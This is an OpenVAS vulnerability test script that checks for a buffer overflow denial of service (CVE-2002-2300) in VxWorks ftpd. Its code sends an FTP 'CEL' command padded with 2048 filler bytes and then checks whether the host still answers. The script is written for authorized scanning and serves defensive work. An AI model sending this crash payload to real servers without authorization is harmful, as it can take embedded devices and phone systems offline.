# OpenVAS Vulnerability Test
# $Id: vxworks_ftpdDOS.nasl 13476 2019-02-05 15:05:10Z cfischer $
# Description: vxworks ftpd buffer overflow Denial of Service
#
# Authors:
# Michael Scheidell at SECNAP
# derived from aix_ftpd, original script
# written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2002 Michael Scheidell
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# References:
# From: "Michael S. Scheidell" <Scheidell@secnap.com>
# Subject: [VU#317417] Denial of Service condition in vxworks ftpd/3com nbx
# To: "BugTraq" <bugtraq@securityfocus.com>, <security@windriver.com>,
#    <support@windriver.com>
# Date: Mon, 2 Dec 2002 13:04:31 -0500

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11184");
  script_version("$Revision: 13476 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-05 16:05:10 +0100 (Tue, 05 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-2300");
  script_bugtraq_id(6297, 7480);
  script_name("vxworks ftpd buffer overflow Denial of Service");
  script_category(ACT_KILL_HOST);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2002 Michael Scheidell");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/vxftpd/detected");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/317417");
  script_xref(name:"URL", value:"http://www.secnap.net/security/nbx001.html");

  script_tag(name:"solution", value:"If you are using an embedded vxworks
  product, please contact the OEM vendor and reference WindRiver field patch
  TSR 296292. If this is the 3com NBX IP Phone call manager, contact 3com.");

  script_tag(name:"affected", value:"This affects VxWorks ftpd versions 5.4 and 5.4.2.");

  script_tag(name:"summary", value:"It was possible to make the remote host
  crash by issuing this FTP command :

  CEL aaaa(...)aaaa

  This problem is similar to the 'aix ftpd' overflow
  but on embedded vxworks based systems like the 3com
  nbx IP phone call manager and seems to cause the server
  to crash.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);
soc = open_sock_tcp(port);
if(!soc)
  exit(0);

buf = ftp_recv_line(socket:soc);
if(!buf || "VxWorks" >!< buf){
  close(soc);
  exit(0);
}

start_denial();

buf = string("CEL a\r\n");
send(socket:soc, data:buf);
r = recv_line(socket:soc, length:1024);
if(!r)
  exit(0);

buf = string("CEL ", crap(2048), "\r\n");
send(socket:soc, data:buf);
b = recv_line(socket:soc, length:1024);
ftp_close(socket: soc);
alive = end_denial();

if(!b)
  security_message(port:port);

if(!alive)
  set_kb_item( name:"Host/dead", value:TRUE );